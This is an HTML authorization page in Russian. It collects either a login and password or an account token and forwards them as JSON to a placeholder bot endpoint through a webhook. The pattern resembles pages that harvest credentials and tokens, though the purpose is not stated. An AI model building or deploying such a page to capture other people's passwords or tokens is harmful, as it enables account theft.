<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Authorization</title>
</head>
<body>
  <h2>Выберите метод авторизации</h2>
  <button id="login-method">Логин и пароль</button>
  <button id="token-method">Токен</button>

  <div id="auth-form" style="display: none;">
    <h3 id="auth-title"></h3>
    <form id="auth-form-body">
      <div id="login-field" style="display: none;">
        <label for="login">Логин:</label>
        <input type="text" id="login" name="login"><br><br>
        <label for="password">Пароль:</label>
        <input type="password" id="password" name="password"><br><br>
      </div>
      <div id="token-field" style="display: none;">
        <label for="token">Токен:</label>
        <input type="text" id="token" name="token"><br><br>
      </div>
      <button type="submit">Отправить</button>
    </form>
  </div>

  <script>
    const loginButton = document.getElementById('login-method');
    const tokenButton = document.getElementById('token-method');
    const authForm = document.getElementById('auth-form');
    const authTitle = document.getElementById('auth-title');
    const loginField = document.getElementById('login-field');
    const tokenField = document.getElementById('token-field');

    loginButton.addEventListener('click', () => {
      authTitle.textContent = 'Введите логин и пароль';
      loginField.style.display = 'block';
      tokenField.style.display = 'none';
      authForm.style.display = 'block';
    });

    tokenButton.addEventListener('click', () => {
      authTitle.textContent = 'Введите токен';
      loginField.style.display = 'none';
      tokenField.style.display = 'block';
      authForm.style.display = 'block';
    });

    document.getElementById('auth-form-body').addEventListener('submit', async (event) => {
      event.preventDefault();

      let data = {};
      if (loginField.style.display === 'block') {
        data = {
          method: 'login',
          login: document.getElementById('login').value,
          password: document.getElementById('password').value
        };
      } else if (tokenField.style.display === 'block') {
        data = {
          method: 'token',
          token: document.getElementById('token').value
        };
      }

      // Отправка данных в бота через API или webhook
      await fetch('https://your-bot-endpoint.com/save-auth', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });

      alert('Данные успешно отправлены!');
    });
  </script>
</body>
</html>
